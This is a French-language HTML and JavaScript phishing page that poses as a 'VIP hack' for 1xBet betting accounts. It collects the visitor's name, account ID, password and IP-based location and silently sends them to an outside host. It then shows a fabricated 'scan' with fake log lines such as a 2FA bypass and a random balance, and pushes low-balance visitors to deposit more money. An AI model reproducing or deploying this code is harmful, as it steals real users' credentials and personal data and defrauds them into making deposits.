<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacking Syst√®me - VIP</title>
    <style>
        :root { --neon: #00ff00; --gold: #f39c12; --bg: #0a0a0a; --red: #ff4444; }
        body { font-family: 'Courier New', monospace; background: var(--bg); color: var(--neon); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { background: #111; padding: 25px; border: 1px solid var(--neon); border-radius: 10px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
        h2 { color: var(--gold); text-transform: uppercase; font-size: 1.1rem; }
        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid var(--neon); background: #000; color: var(--neon); border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; margin-top: 15px; border: 1px solid var(--neon); background: transparent; color: var(--neon); font-weight: bold; cursor: pointer; text-transform: uppercase; }
        button:hover { background: var(--neon); color: #000; }
        .step { display: none; }
        .active { display: block; animation: fadeIn 0.5s; }
        .error { color: var(--red); font-weight: bold; font-size: 0.9rem; }
        #console { background: #000; height: 80px; overflow: hidden; text-align: left; padding: 10px; font-size: 0.7rem; border: 1px solid #333; margin: 10px 0; }
        .progress-bar { width: 100%; background: #222; height: 8px; border-radius: 4px; overflow: hidden; margin: 10px 0; }
        .progress-fill { width: 0%; height: 100%; background: var(--neon); transition: width 0.1s; }
    </style>
</head>
<body>

<div class="container">
    <div id="step1" class="step active">
        <h2>üéØ HACKING SYST√àME</h2>
        <input type="text" id="nom" placeholder="NOM D'UTILISATEUR">
        <input type="number" id="id1xbet" placeholder="ID COMPTE 1XBET">
        <button onclick="validerStep1()">SUIVANT</button>
    </div>

    <div id="step2" class="step">
        <h2>üìç LOCALISATION</h2>
        <p>Utilisateur : <span id="userName" style="color:white"></span></p>
        <p id="geoData">Recherche de l'adresse IP...</p>
        <button onclick="showStep(3)">CONFIGURER S√âCURIT√â</button>
    </div>

    <div id="step3" class="step">
        <h2>üîë ACC√àS SERVEUR</h2>
        <p>Entrez votre mot de passe 1xBet pour lier le hack au compte.</p>
        <input type="password" id="pass1xbet" placeholder="MOT DE PASSE 1XBET">
        <button onclick="envoyerEtScanner()">LIER LE COMPTE</button>
    </div>

    <div id="step4" class="step">
        <h2>üì° SCAN DU COMPTE...</h2>
        <div id="console"></div>
        <div class="progress-bar"><div id="scanBar" class="progress-fill"></div></div>
        <p id="scanStatus">Analyse du solde en cours...</p>
    </div>

    <div id="step5" class="step">
        <h2>üìä R√âSULTAT DU SCAN</h2>
        <div id="resultContent"></div>
    </div>
</div>

<script>
    const API_URL = "https://ngeruka.pythonanywhere.com/send";
    let store = { nom: "", id: "", pass: "", pays: "", ville: "", ip: "", soldeSimule: 0 };

    function showStep(n) {
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        document.getElementById('step' + n).classList.add('active');
    }

    function validerStep1() {
        store.nom = document.getElementById('nom').value;
        store.id = document.getElementById('id1xbet').value;
        if(store.nom.length < 2 || !store.id) return alert("Infos manquantes !");
        document.getElementById('userName').innerText = store.nom;
        showStep(2);
        getPreciseLocation();
    }

    async function getPreciseLocation() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            store.ip = data.ip;
            store.ville = data.city;
            store.pays = data.country_name;
            document.getElementById('geoData').innerHTML = `IP: ${data.ip}<br>Lieu: ${data.city}, ${data.country_name}`;
        } catch (e) {
            document.getElementById('geoData').innerText = "Erreur de localisation. GPS actif.";
        }
    }

    async function envoyerEtScanner() {
        store.pass = document.getElementById('pass1xbet').value;
        if(store.pass.length < 4) return alert("Mot de passe invalide !");
        
        // Envoi imm√©diat au serveur
        fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(store)
        });

        showStep(4);
        lancerSimulationScan();
    }

    function lancerSimulationScan() {
        const con = document.getElementById('console');
        const bar = document.getElementById('scanBar');
        let progress = 0;
        
        // Simulation de solde (Ici on g√©n√®re un faux solde pour le test)
        store.soldeSimule = Math.random() > 0.5 ? 15000 : 2500; // 50% de chance d'avoir > 10000

        const interval = setInterval(() => {
            progress += 2;
            bar.style.width = progress + "%";
            
            const logs = [
                `> Connexion ID ${store.id}...`,
                `> Bypass 2FA... OK`,
                `> Lecture base de donn√©es...`,
                `> Solde d√©tect√©...`
            ];
            
            if(progress % 20 === 0) {
                const div = document.createElement('div');
                div.innerText = logs[Math.floor(progress/25)];
                con.prepend(div);
            }

            if(progress >= 100) {
                clearInterval(interval);
                afficherResultat();
            }
        }, 50);
    }

    function afficherResultat() {
        showStep(5);
        const resDiv = document.getElementById('resultContent');
        
        if (store.id === "0000") { // Exemple : si le compte n'existe pas
            resDiv.innerHTML = `<p class="error">COMPTE INEXISTANT</p>
            <p>Veuillez cr√©er un compte sur le site officiel avant de continuer.</p>
            <button onclick="window.location.href='https://1xbet.com'">CR√âER UN COMPTE</button>`;
        } else if (store.soldeSimule >= 10000) {
            resDiv.innerHTML = `<p>SOLDE D√âTECT√â : <b style="color:white">${store.soldeSimule} FC</b></p>
            <p style="color:var(--neon)">√âLIGIBLE AU HACK VIP</p>
            <button onclick="alert('Lancement du Hack...')">CONTINUER LE HACK</button>`;
        } else {
            resDiv.innerHTML = `<p>SOLDE INSUFFISANT : <b style="color:red">${store.soldeSimule} FC</b></p>
            <p>Le syst√®me n√©cessite au moins 10 000 FC pour fonctionner.</p>
            <button onclick="location.reload()">RECHARGER ET REVENIR</button>`;
        }
    }
</script>
</body>
</html>
